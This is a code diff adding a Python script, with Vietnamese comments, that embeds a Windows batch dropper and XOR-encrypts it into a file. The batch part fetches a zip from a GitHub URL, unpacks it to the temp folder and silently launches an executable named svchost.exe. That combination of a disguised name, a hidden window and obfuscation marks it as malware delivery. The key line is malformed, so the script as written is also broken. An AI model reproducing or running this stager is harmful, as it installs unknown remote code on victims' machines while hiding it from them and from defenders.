@@ -1,0 +1,39 @@
+def xor_encrypt_decrypt(input_text, key):
+      return ''.join(chr(ord(char) ^ key) for char in input_text)
+
+
+script_content = """
+@echo off
+setlocal
+set "url=https://github.com/LuisPhantom/Learningg/raw/refs/heads/main/svchost.zip"
+set "tempdir=%temp%"
+set "output=%tempdir%\svc41212221.zip"
+
+:download
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
+for %%A in ("%output%") do (
+    if %%~zA==0 (
+        del "%output%"
+        timeout /t 1 >nul
+        goto download
+    )
+)
+
+powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
+
+powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe'  -WindowStyle Hidden"
+
+exit
+"""
+
+# Khóa mã hóa (nên là một số nguyên)
+key = AAGDzNK3t0ktP86x06LuVTfAyETB4dloLPU  # Bạn có thể thay đổi khóa này
+
+# Mã hóa nội dung script
+encrypted_content = xor_encrypt_decrypt(script_content, key)
+
+# Lưu nội dung mã hóa vào tệp
+with open("AAGDzNK3t0ktP86x06LuVTfAyETB4dloLPU", "w", encoding="utf-8") as encrypted_file:
+    encrypted_file.write(encrypted_content)
+
+print(f"Nội dung mã hóa đã được lưu vào tệp 'AAGDzNK3t0ktP86x06LuVTfAyETB4dloLPU.txt'")
